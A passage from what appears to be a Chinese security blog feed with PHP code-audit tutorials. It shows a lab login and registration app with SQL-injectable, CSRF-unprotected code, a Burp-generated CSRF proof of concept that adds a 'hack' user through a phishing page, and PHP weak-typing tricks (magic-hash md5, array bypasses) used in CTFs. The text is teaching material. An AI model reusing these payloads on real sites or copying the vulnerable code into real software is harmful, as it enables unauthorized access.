punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>login.php：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token shell-comment comment"># 判断POST是否为空</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'&lt;script>alert("非法访问！")&lt;/script>'</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">'&lt;a href="index.html">返回登录&lt;/a>或者'</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">'&lt;a href="add.html">前往注册&lt;/a>'</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token shell-comment comment"># 传值赋值</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 包含配置文件</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'conn.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 构造SQL语句</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM USER WHERE username='$username' and password='$password'"</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 接收结果集</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"执行Mysql语句失败！"</span><span class="token punctuation">.</span><span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 判断结果集是否赋值给了$row</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token shell-comment comment"># 启用新会话</span>    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">'欢迎'</span><span class="token punctuation">,</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'登录系统！'</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;a href='add.html'>添加用户&lt;/a>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('账号或密码错误！')&lt;/script>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;a href=index.html>返回登录&lt;/a>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>add.html:</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>添加用户<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>add.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    I D：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ID<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>    用户名：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>    密码：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>确认添加<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>add<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>add.php:</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token shell-comment comment"># 开启新会话</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 判断SESSION中的name值是否为空</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('非法访问，请注册！')&lt;/script>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">'&lt;a href="add.html">前往注册&lt;/a>'</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token shell-comment comment"># 传值赋值</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'ID'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 包含配置文件</span><span class="token keyword">include</span> <span class="token string">"conn.php"</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 构造SQL语句</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"INSERT INTO user(ID,username,password) VALUES('$id','$username','$password')"</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'语句执行失败！'</span><span class="token punctuation">.</span><span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 接收结果集</span><span class="token variable">$result</span> <span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 判断结果集书否存在</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'用户'</span><span class="token punctuation">.</span><span class="token variable">$username</span><span class="token punctuation">.</span><span class="token string">'添加成功！'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string">'添加失败！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="实施攻击"><a href="#实施攻击" class="headerlink" title="实施攻击"></a>实施攻击</h3><p>假如我们没有账号，也无法完成添加用户的这个操作，那么我们就可以在本地搭建一个一样的CMS，抓一下它注册的数据包，搭建一个钓鱼网站，诱导<strong>处于活跃状态</strong>的管理员去点击。</p><p>抓包 –&gt;右键构造CSRF验证页面：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020112814401062.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>Poc：</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!-- CSRF PoC - generated by Burp Suite Professional --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">history<span class="token punctuation">.</span><span class="token function">pushState</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://1.1.1.137:8888/csrf/add.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ID<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>11<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hack<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hack<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>add<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ç&amp;#161;&amp;#174;è&amp;#174;&amp;#164;æ&amp;#183;&amp;#187;å&amp;#138;&amp;#160;<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Submit request<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>现在我们登录系统账号，来扮演上当受骗的管理员：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201128144154485.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>我们去访问钓鱼页面并点击按钮，成功触发CSRF漏洞：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201128144247290.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h3><ul><li>目标存在CSRF漏洞</li><li>受害者需要保持目标站点的活跃状态</li><li>受害者需要点击钓鱼链接</li></ul><h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><ul><li>验证码</li><li>添加 Referer验证</li><li>添加 Token验证</li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 代码审计篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计基础：PHP弱类型</title>
      <link href="/posts/9e2c1a9e.html"/>
      <url>/posts/9e2c1a9e.html</url>
      
        <content type="html"><![CDATA[<h3 id="变量类型"><a href="#变量类型" class="headerlink" title="变量类型"></a>变量类型</h3><ul><li>标准类型：布尔型、整型、浮点、字符</li><li>复杂类型：数组、对象</li><li>特殊类型：资源</li></ul><h3 id="操作之间的比较"><a href="#操作之间的比较" class="headerlink" title="操作之间的比较"></a>操作之间的比较</h3><ul><li>字符串与数字</li><li>字符串与数组</li><li>数字与数组</li><li>数字+e+数字</li></ul><p>以上几点都包含在下面的代码中了：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token shell-comment comment"># 字符串与数字</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">==</span><span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token shell-comment comment"># True</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">==</span><span class="token string">"1admin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token shell-comment comment"># False</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">==</span><span class="token string">"admin1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token shell-comment comment">#　True</span><span class="token shell-comment comment"># 字符串与数组</span><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string">"0"</span><span class="token operator">==</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># False</span><span class="token shell-comment comment"># 数字与数组</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">==</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token shell-comment comment"># False</span><span class="token shell-comment comment"># xxexx</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token number">0e123456</span><span class="token operator">==</span><span class="token number">0e654321</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token shell-comment comment"># True</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token number">1e1</span><span class="token operator">==</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token shell-comment comment"># True</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="empty-与isset"><a href="#empty-与isset" class="headerlink" title="empty()与isset()"></a>empty()与isset()</h4><ul><li>变量为：0，”0”，null，’’，false，array()时，使用empty函数，返回的都为True</li><li>变量未定义或者为null时，isset函数返回的都是faluse，其他都为true</li></ul><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'&lt;h2>empty&lt;/h2>'</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'&lt;h2>isset&lt;/h2>'</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201209155843605.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="md5"><a href="#md5" class="headerlink" title="md5()"></a>md5()</h4><p>这个函数在CTF中还是比较常见的，一般就是一个if判断，两个用户可控的值传进来，经过md5()加密，对比加密后的结果，相等就输出flag，不等就终止程序。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201209163135888.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$arr1</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'test1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$arr2</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'test2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'&lt;h1>数组绕过md5函数&lt;/h1>'</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$arr2</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$arr1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'&lt;h1>科学计数法绕过md5函数&lt;/h1>/'</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token constant">QNKCDZO</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span>s155964671a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201209162017111.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp()"></a>strcmp()</h4><p>这个函数也是常用作一个判断，如果返回的值为0则程序继续运行，不为0则终止<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201209163055125.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$pwd</span> <span class="token operator">=</span> <span class="token string">"1234567"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pwd'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$pwd</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'success'</span><span class="token punctuation">;</span>    